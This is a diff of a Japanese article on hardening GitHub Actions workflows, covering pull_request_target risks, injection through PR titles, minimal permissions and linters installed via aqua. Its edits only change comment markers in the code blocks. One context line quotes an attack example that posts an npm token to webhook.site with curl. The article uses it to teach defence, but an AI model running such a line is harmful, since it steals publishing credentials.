@@ -110,7 +110,7 @@ exec(`curl -d "${npmToken}" https://webhook.site/...`);
 `pull_request` は、外部から送られるプルリクエストに対しては秘匿情報を扱わず、権限も読み取りに限定されます。プルリクエストで提出されたコードをそのまま実行しても、リポジトリや機密情報が危険にさらされないように設計された仕組みです。
 
 ```yml
-# テストだけ行うワークフローの例
+## テストだけ行うワークフローの例
 on:
   pull_request:
 
@@ -125,7 +125,7 @@ jobs:
 一方で `pull_request_target` は、プルリクエストのベースとなるリポジトリ側の設定(main ブランチなど)を用いて実行されます。
 そのため、フォークされたリポジトリからの提案であっても秘匿情報や書き込み権限を扱えます。便利である反面、扱いを誤れば、その権限が攻撃者に開かれてしまう危険性があります。
 ```yml
-# PR 自体にラベルを付与するワークフロー（Secret や write 権限が必要）の例
+## PR 自体にラベルを付与するワークフロー（Secret や write 権限が必要）の例
 on:
   pull_request_target:
     types: [opened]
@@ -169,7 +169,7 @@ run: echo "PR title: $PR_TITLE"
 ```yaml
 name: CI
 
-# ワークフロー全体で全権限を剥奪
+## ワークフロー全体で全権限を剥奪
 permissions: {}
 
 jobs:
@@ -195,10 +195,10 @@ jobs:
 既存ワークフローで外部入力を直接展開している箇所を環境変数経由に変更してください。具体的には、`${{ github.event.pull_request.title }}` のような記述を見つけ、以下のように修正します。
 
 ```yaml
-# 修正前
+## 修正前
 run: echo "PR title: ${{ github.event.pull_request.title }}"
 
-# 修正後
+## 修正後
 env:
   PR_TITLE: ${{ github.event.pull_request.title }}
 run: echo "PR title: $PR_TITLE"
@@ -214,32 +214,32 @@ run: echo "PR title: $PR_TITLE"
 これらのツールを環境の差異なく使用するために、CLI ツールのバージョン管理ツールである aqua をインストールします。
 
 ```bash
-# aqua-installerのチェックサムを検証してインストール
+## aqua-installerのチェックサムを検証してインストール
 curl -sSfL -O https://raw.githubusercontent.com/aquaproj/aqua-installer/v4.0.2/aqua-installer
 echo "98b883756cdd0a6807a8c7623404bfc3bc169275ad9064dc23a6e24ad398f43d  aqua-installer" | sha256sum -c -
 chmod +x aqua-installer
 ./aqua-installer
 
-# 環境変数PATHの設定（Linux or MacOS）
+## 環境変数PATHの設定（Linux or MacOS）
 export PATH="${AQUA_ROOT_DIR:-${XDG_DATA_HOME:-$HOME/.local/share}/aquaproj-aqua}/bin:$PATH"
 
 aqua -v
-# aqua version 2.55.1
+## aqua version 2.55.1
 
-# 初期化
+## 初期化
 aqua init
 ```
 実行すると `aqua.yaml` が作成されますので、関連するツールをインストールしていきましょう。
 ```yaml aqua.yaml
 ---
-# yaml-language-server: $schema=https://raw.githubusercontent.com/aquaproj/aqua/main/json-schema/aqua-yaml.json
-# aqua - Declarative CLI Version Manager
-# https://aquaproj.github.io/
-# checksum:
-#   enabled: true
-#   require_checksum: true
-#   supported_envs:
-#   - all
+## yaml-language-server: $schema=https://raw.githubusercontent.com/aquaproj/aqua/main/json-schema/aqua-yaml.json
+## aqua - Declarative CLI Version Manager
+## https://aquaproj.github.io/
+## checksum:
+##   enabled: true
+##   require_checksum: true
+##   supported_envs:
+##   - all
 registries:
 - type: standard
   ref: v4.436.0  # renovate: depName=aquaproj/aqua-registry
@@ -248,7 +248,7 @@ packages:
 ```
 次に以下のコマンドを実行して静的解析ツールをインストールするための設定を追加します。
 ```bash
-# インストール
+## インストール
 aqua g -i rhysd/actionlint
 aqua g -i suzuki-shunsuke/ghalint
 aqua g -i zizmorcore/zizmor
@@ -270,7 +270,7 @@ https://zenn.dev/kou_pg_0131/articles/gha-static-checker
 ```bash
 actionlint
 
-# JSONで出力する例
+## JSONで出力する例
 actionlint -format '{{json .}}'
 ```
 
@@ -288,7 +288,7 @@ zizmor .github/workflows/
 pinact は、GitHub Actions で使用しているアクションのバージョンをコミットハッシュに自動変換するツールです。ghalint でコミットハッシュ参照が推奨されても、手動で変換するのは手間がかかります。pinact を使用することで、既存のワークフローを一括でコミットハッシュ参照に変換できます。
 
 ```bash
-# タグをコミットハッシュに変換
+## タグをコミットハッシュに変換
 pinact run
 ```
 
